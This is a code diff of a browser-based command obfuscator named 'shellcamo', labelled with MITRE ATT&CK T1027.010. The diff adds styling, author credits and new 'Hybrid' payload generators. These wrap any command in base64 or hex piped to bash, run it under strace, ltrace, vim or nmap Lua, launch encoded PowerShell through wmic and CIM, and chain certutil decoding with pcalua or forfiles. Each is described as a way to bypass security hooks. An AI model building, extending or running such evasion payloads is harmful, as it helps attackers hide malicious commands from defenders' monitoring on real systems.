@@ -31,9 +31,21 @@
 
         .container { max-width: 900px; margin: 0 auto; }
 
+        .banner {
+            text-align: center;
+            font-size: 0.7rem;
+            color: var(--muted);
+            background: var(--surface-alt);
+            padding: 5px;
+            border: 1px solid var(--border);
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+
         header {
             border-bottom: 1px solid var(--border);
-            padding-bottom: 10px;
+            padding-bottom: 15px;
             margin-bottom: 25px;
         }
 
@@ -42,6 +54,22 @@
             font-weight: normal;
             color: var(--text);
             letter-spacing: -0.5px;
+        }
+
+        .credits {
+            text-align: right;
+            font-size: 0.8rem;
+            color: var(--muted);
+            margin-top: 8px;
+        }
+
+        .credits a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .credits strong {
+            color: var(--green);
         }
 
         label {
@@ -189,8 +217,14 @@
 </head>
 <body>
     <div class="container">
+        <div class="banner">
+            authorized use only // local execution // MITRE ATT&CK T1027.010
+        </div>
         <header>
             <h1>shellcamo // cmd obfuscator</h1>
+            <div class="credits">
+                Made By <strong>Aryan Giri</strong> | <a href="https://github.com/giriaryan694-a11y" target="_blank">giriaryan694-a11y</a>
+            </div>
         </header>
 
         <section class="input-section">
@@ -250,7 +284,6 @@
             const code = card.dataset.payloadCode;
             if (!code) return;
 
-            // Fixed: Proper decoding for non-ASCII characters
             const decoded = decodeURIComponent(escape(atob(code)));
 
             navigator.clipboard.writeText(decoded).then(() => {
@@ -350,6 +383,13 @@
             payloads.push({ name: 'ltrace (Wrapper)', tag: 'LOLBin', description: 'Executes under ltrace to bypass userland hooks', code: `ltrace -o /dev/null ${cmd}` });
             payloads.push({ name: 'env (Prefix)', tag: 'LOLBin', description: 'Executes via env to bypass command-line parsing rules', code: `env ${cmd}` });
 
+            // --- HYBRID TECHNIQUES (LOLBins + Encoding) ---
+            payloads.push({ name: 'strace + Base64', tag: 'Hybrid', description: 'Bypasses userland hooks while decoding base64 in memory', code: `strace -o /dev/null bash -c "echo '${btoa(cmd)}' | base64 -d | bash"` });
+            payloads.push({ name: 'strace + Hex', tag: 'Hybrid', description: 'Bypasses userland hooks while evaluating ANSI-C hex escapes', code: `strace -o /dev/null eval $'${toHex(cmd)}'` });
+            payloads.push({ name: 'ltrace + Base64', tag: 'Hybrid', description: 'Bypasses library call hooks while decoding base64 payload', code: `ltrace -o /dev/null bash -c "echo '${btoa(cmd)}' | base64 -d | bash"` });
+            payloads.push({ name: 'vim + Base64', tag: 'Hybrid', description: 'Spawns shell via vim ex mode, decoding base64 payload dynamically', code: `vim -c ':!echo ${btoa(cmd)} | base64 -d | bash' -c ':q'` });
+            payloads.push({ name: 'nmap + Base64 (Lua)', tag: 'Hybrid', description: 'nmap Lua engine executes a base64 decoded shell command', code: `nmap --script <(echo 'os.execute("echo \\"${btoa(cmd)}\\" | base64 -d | bash")')` });
+
             return payloads;
         }
 
@@ -372,6 +412,10 @@
             payloads.push({ name: 'CimInstance (Modern WMI)', tag: 'LOLBin', description: 'Executes via CIM (modern WMI)', code: `Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="${safeCmd}"}` });
             payloads.push({ name: 'Bash (WSL)', tag: 'LOLBin', description: 'Executes via WSL bash if installed', code: `bash.exe -c "${safeCmd}"` });
 
+            // --- HYBRID TECHNIQUES (LOLBins + Encoding) ---
+            payloads.push({ name: 'WMIC + EncodedCommand', tag: 'Hybrid', description: 'Spawns process via WMI, executing Encoded PowerShell payload', code: `wmic process call create "powershell.exe -e ${toPowerShellBase64(cmd)}"` });
+            payloads.push({ name: 'CimInstance + Encoded', tag: 'Hybrid', description: 'Modern WMI execution of an Encoded PowerShell payload', code: `Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell.exe -enc ${toPowerShellBase64(cmd)}"}` });
+
             return payloads;
         }
 
@@ -389,6 +433,18 @@
             payloads.push({ name: 'wmic (Process Create)', tag: 'LOLBin', description: 'Spawns process via WMI command line', code: `wmic process call create "${safeCmd}"` });
             payloads.push({ name: 'sc (Service Create)', tag: 'LOLBin', description: 'Creates and starts a temporary service (requires admin)', code: (() => { const sName = `sys${rndInt(10,99)}`; return `sc create ${sName} binPath= "${safeCmd}" && sc start ${sName} && sc delete ${sName}`; })() });
             payloads.push({ name: 'pcalua (Compat Assistant)', tag: 'LOLBin', description: 'Executes via Program Compatibility Assistant', code: `pcalua.exe -a "${safeCmd}"` });
+
+            // --- HYBRID TECHNIQUES (LOLBins + Encoding) ---
+            payloads.push({ name: 'pcalua + Base64 (certutil)', tag: 'Hybrid', description: 'Program Compatibility Assistant decodes and runs base64 via certutil', code: (() => { 
+                const b64 = btoa(cmd); 
+                const id = rndInt(100,999);
+                return `pcalua.exe -a "cmd /c echo ${b64} > %TEMP%\\b${id}.txt && certutil -decode %TEMP%\\b${id}.txt %TEMP%\\c${id}.txt >nul && cmd /c %TEMP%\\c${id}.txt"`; 
+            })() });
+            payloads.push({ name: 'forfiles + Base64', tag: 'Hybrid', description: 'forfiles executes base64 decoded command via cmd', code: (() => {
+                const b64 = btoa(cmd);
+                const id = rndInt(100,999);
+                return `echo ${b64} > %TEMP%\\b${id}.b64 && certutil -decode %TEMP%\\b${id}.b64 %TEMP%\\c${id}.txt >nul && forfiles /p %TEMP% /m c${id}.txt /c "cmd /c @file"`;
+            })() });
 
             return payloads;
         }
